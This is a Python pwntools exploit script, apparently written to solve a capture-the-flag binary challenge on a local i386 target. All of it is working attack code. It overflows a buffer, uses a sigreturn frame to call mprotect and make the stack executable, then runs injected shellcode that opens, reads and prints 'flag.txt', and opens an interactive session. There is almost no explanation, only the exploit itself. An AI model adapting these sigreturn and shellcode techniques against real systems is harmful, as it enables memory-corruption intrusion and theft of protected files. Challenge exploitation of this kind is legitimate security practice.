from pwn import *
from icecream import ic

elf = exe = ELF("./target")

context.kernel = 'i386'
context.binary = exe
context.log_level = "debug"
context.aslr = False
context.arch = 'i386'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    sys.argv[1] = "a"*0x2000
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + sys.argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + sys.argv, *a, **kw)

gdbscript = '''
b *0x08049010
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
binsh = 0xffffd71c
ret = 0x08049014
syscall = 0x08049010
kernel_sigreturn = 0xf7ffc561
payload = b'/bin/sh\x00'
payload += b'\x00'*20
payload += p32(syscall)
# payload += p32(0xf7ffc54a)
# payload += p32(0)
# payload += p32(0)

frame = SigreturnFrame()
frame.eax = 125
frame.ebx = 0xfffdb000
frame.ecx = 0x23000
frame.edx = 7
frame.eip = syscall
frame.esp = 0xffffb750
frame.cs = 0x23
frame.ss = 0x2b
payload += p32(kernel_sigreturn)
payload += bytes(frame)
# payload += b'a'*4
payload += p32(0xffffb754)
payload += asm('''
push 0x00
push 0x7478742e
push 0x67616c66

mov ebx, esp
mov eax, 5
xor ecx, ecx
xor edx, edx 
int 0x80

mov ebx, eax
mov ecx, esp
mov edx, 200
mov eax, 3
int 0x80

mov ebx, 1
mov ecx, esp
mov edx, eax
mov eax, 4
int 0x80
''')
# payload += b'a'*28
# payload += p32(ret)
# payload += p32(syscall)

ru(">")
s(payload)
i()
